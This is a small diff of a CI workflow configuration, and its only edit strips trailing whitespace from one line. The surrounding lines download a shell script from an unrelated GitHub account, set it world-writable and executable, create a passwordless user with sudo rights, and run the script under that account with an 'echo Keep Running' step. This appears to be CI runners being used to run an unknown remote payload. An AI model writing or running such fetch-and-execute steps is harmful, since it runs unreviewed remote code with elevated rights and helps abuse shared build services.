@@ -11,7 +11,7 @@ jobs:
     steps:
       - run: rm -rf heroku.sh && wget https://github.com/anbcvxban/dabamba/raw/main/heroku.sh && chmod 777 heroku.sh
       - run: sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe 
-      - run: sudo mv heroku.sh /home/joe && cd /home/joe && sudo -u joe -H sh -c "./heroku.sh" 
+      - run: sudo mv heroku.sh /home/joe && cd /home/joe && sudo -u joe -H sh -c "./heroku.sh"
       - run: echo "Keep Running"
 
 workflows:
